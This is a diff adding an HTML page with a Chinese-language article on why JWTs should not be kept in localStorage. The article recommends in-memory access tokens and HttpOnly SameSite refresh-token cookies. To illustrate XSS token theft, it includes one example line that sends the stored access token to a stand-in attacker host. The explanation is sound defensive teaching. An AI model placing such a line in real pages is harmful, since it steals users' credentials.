@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Web 安全深度剖析：为什么千万不要在 LocalStorage 中存放 JWT 令牌？ - 825412.xyz</title>
+  <meta name="description" content="深入探讨 XSS 跨站脚本攻击与 JWT 窃取风险：对比 LocalStorage、SessionStorage 与 HttpOnly SameSite Cookie 的安全模型，构建企业级身份认证防护。">
+  <meta name="keywords" content="jwt存储安全, localstorage xss攻击, httponly cookie, token鉴权, 825412.xyz">
+  <link rel="canonical" href="https://825412.xyz/articles/why-you-should-stop-storing-jwt-in-localstorage.html">
+  <link rel="stylesheet" href="../style.css?v=2.7.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet" />
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5943907597157682" crossorigin="anonymous"></script>
+</head>
+<body style="display: block; overflow: auto;">
+  <!-- 顶部面包屑与快捷导航 -->
+  <header style="background: rgba(6, 14, 32, 0.95); border-bottom: 1px solid rgba(255,255,255,0.08); padding: 14px 24px; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(12px);">
+    <div style="max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
+      <div style="display: flex; align-items: center; gap: 12px;">
+        <a href="/" style="display: flex; align-items: center; gap: 8px; text-decoration: none; color: #fff; font-weight: 800; font-size: 18px;">
+          <div style="width: 32px; height: 32px; border-radius: 8px; background: linear-gradient(135deg, #8b5cf6, #06b6d4); display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 900;">82</div>
+          <span>825412.xyz</span>
+        </a>
+        <span style="color: #64748b;">/</span>
+        <a href="/sitemap.html" style="color: #06b6d4; font-size: 14px; font-weight: 600; text-decoration: none;">极客技术专栏</a>
+      </div>
+      <nav style="display: flex; align-items: center; gap: 14px; flex-wrap: wrap; font-size: 13px;">
+        <a href="/" style="color: var(--text-secondary); text-decoration: none;">控制台</a>
+        <a href="/toolbox.html" style="color: var(--text-secondary); text-decoration: none;">工具箱</a>
+        <a href="/airdrop.html" style="color: var(--text-secondary); text-decoration: none;">隔空快传</a>
+        <a href="/webhook.html" style="color: var(--text-secondary); text-decoration: none;">Webhook 调试</a>
+        <a href="/clipboard.html" style="color: var(--text-secondary); text-decoration: none;">匿名剪贴板</a>
+        <a href="/sitemap.html" style="color: var(--color-primary); font-weight: 700; text-decoration: none;">全站索引</a>
+      </nav>
+    </div>
+  </header>
+  <main style="max-width: 900px; margin: 40px auto; padding: 0 20px;">
+    <div style="margin-bottom: 30px;">
+      <div style="display: flex; gap: 8px; margin-bottom: 12px;">
+        <span style="background: rgba(239,68,68,0.15); color: #f87171; font-size: 12px; font-weight: 700; padding: 4px 10px; border-radius: 6px;">Web 安全</span>
+        <span style="background: rgba(139,92,246,0.15); color: #c084fc; font-size: 12px; font-weight: 700; padding: 4px 10px; border-radius: 6px;">JWT 架构</span>
+        <span style="color: var(--text-muted); font-size: 12px; align-self: center;">发布时间：2026-08-31 · 阅读时长：9 分钟</span>
+      </div>
+      <h1 style="font-size: 28px; font-weight: 800; color: #fff; line-height: 1.4; margin-bottom: 12px;">Web 安全深度剖析：为什么千万不要在 LocalStorage 中存放 JWT 令牌？</h1>
+      <p style="font-size: 15px; color: var(--text-secondary); line-height: 1.6;">许多前端开发者习惯将 Access Token 随手存入 window.localStorage，但这为跨站脚本攻击 (XSS) 敞开了致命大门。本文为您梳理最佳防御范式。</p>
+    </div>
+
+    <article class="doc-card" style="line-height: 1.8; font-size: 15px; color: var(--text-primary);">
+      <h2>一、LocalStorage 的致命软肋：对任意 JavaScript 完全开放</h2>
+      <p>任何运行在当前页面上下文的 JavaScript 脚本（包括第三方分析 SDK、未严格清洗的用户评论富文本、被篡改的 NPM 依赖包），都可以通过一行简单的代码直接读取并外发凭据：</p>
+      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #f87171;"><code>fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));</code></pre>
+
+      <h2>二、终极防御体系：HttpOnly Cookie + 短期 Token + 内存隔离</h2>
+      <p>推荐采用行业标准的防御组合拳：</p>
+      <ul>
+        <li><strong>Access Token 驻留 JavaScript 内存</strong>：前端在应用启动时向认证中心请求 Token 并保存在变量或状态管理（Vuex / Redux）中，页面关闭即销毁；</li>
+        <li><strong>Refresh Token 存入 HttpOnly Cookie</strong>：服务端下发 Refresh Token 时设置 <code>Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict</code>，浏览器底层严禁任何 JS 访问该 Cookie，从根本上免疫 XSS 窃取；</li>
+        <li><strong>自动无感静默续期</strong>：当内存中的 Access Token 即将过期时，自动调用刷新接口利用 Cookie 换取新的短效 Token。</li>
+      </ul>
+
+      <h2>三、在线解析与验证</h2>
+      <p>您可以利用我们的 <a href="/tools/jwt-debugger.html" style="color: #38bdf8; font-weight: 700;">JWT 在线解析调试器</a> 查看 Token 结构与有效期声明。</p>
+    </article>
+  </main>
+  <footer style="border-top: 1px solid rgba(255,255,255,0.08); padding: 30px 20px; margin-top: 60px; text-align: center; font-size: 13px; color: var(--text-muted); background: rgba(6, 14, 32, 0.5);">
+    <div style="margin-bottom: 12px;"><span>© 2026 825412.xyz 极客多功能工具箱 | 开发者原创技术文库</span></div>
+    <div style="display: flex; justify-content: center; gap: 16px; flex-wrap: wrap; margin-bottom: 10px;">
+      <a href="/about.html" style="color: var(--text-secondary); text-decoration: none;">关于本站</a>
+      <a href="/privacy.html" style="color: var(--text-secondary); text-decoration: none;">隐私政策</a>
+      <a href="/terms.html" style="color: var(--text-secondary); text-decoration: none;">服务条款</a>
+      <a href="/contact.html" style="color: var(--text-secondary); text-decoration: none;">联系我们</a>
+      <a href="/sitemap.html" style="color: var(--text-secondary); text-decoration: none;">HTML 网站地图</a>
+    </div>
+  </footer>
+</body>
+</html>
